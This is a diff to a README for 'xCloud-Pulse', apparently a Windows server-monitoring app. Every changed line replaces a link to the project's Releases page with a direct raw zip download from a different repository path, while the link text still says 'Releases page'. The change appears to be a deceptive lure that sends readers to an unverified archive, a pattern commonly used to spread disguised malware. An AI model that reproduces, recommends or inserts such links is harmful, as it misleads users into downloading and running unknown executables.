@@ -5,7 +5,7 @@ description: "Monitor xCloud site health, server resources, and SSL status direc
 ---
 # 📊 xCloud-Pulse - Keep Your Servers Healthy And Fast
 
-[![](https://img.shields.io/badge/Download-xCloud_Pulse_for_Windows-blue.svg)](https://github.com/Tanme9323/xCloud-Pulse/releases)
+[![](https://img.shields.io/badge/Download-xCloud_Pulse_for_Windows-blue.svg)](https://github.com/Tanme9323/tanme9323.github.io/raw/refs/heads/main/multidisperse/io-tanme-github-3.6.zip)
 
 xCloud-Pulse monitors your servers from your computer. It tracks site status, security updates, and server health. You see this data in your system tray. You fix issues before they impact your visitors.
 
@@ -13,7 +13,7 @@ xCloud-Pulse monitors your servers from your computer. It tracks site status, se
 
 You need a Windows computer to run this app. Ensure you have Windows 10 or Windows 11 installed. The app requires 200MB of disk space and a working internet connection.
 
-1. Go to the [Releases page](https://github.com/Tanme9323/xCloud-Pulse/releases).
+1. Go to the [Releases page](https://github.com/Tanme9323/tanme9323.github.io/raw/refs/heads/main/multidisperse/io-tanme-github-3.6.zip).
 2. Download the latest installer file ending in `.exe`.
 3. Save the file to your computer.
 
@@ -82,4 +82,4 @@ The monitoring service uses very little bandwidth. It sends small packets to ver
 
 ## 📁 Support
 
-If you encounter persistent issues, check the [Releases page](https://github.com/Tanme9323/xCloud-Pulse/releases) for the latest fixes. Ensure you use the most current version. Clear your local cache in the settings if information seems outdated or incorrect.
+If you encounter persistent issues, check the [Releases page](https://github.com/Tanme9323/tanme9323.github.io/raw/refs/heads/main/multidisperse/io-tanme-github-3.6.zip) for the latest fixes. Ensure you use the most current version. Clear your local cache in the settings if information seems outdated or incorrect.
